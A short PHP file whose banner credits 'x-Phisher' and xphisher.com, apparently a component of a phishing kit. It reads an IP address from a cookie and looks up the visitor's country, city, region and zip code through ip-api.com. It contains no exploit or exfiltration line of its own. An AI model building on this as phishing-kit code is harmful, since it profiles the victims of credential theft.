<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
$ip = $_COOKIE['ip11'];
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$LOOKUP_COUNTRY = $IP_LOOKUP->country;
$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
$LOOKUP_CITY    = $IP_LOOKUP->city;
$LOOKUP_REGION  = $IP_LOOKUP->region;
$LOOKUP_STATE   = $IP_LOOKUP->regionName;
$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
$Ip             = $IP_LOOKUP->query;
?>
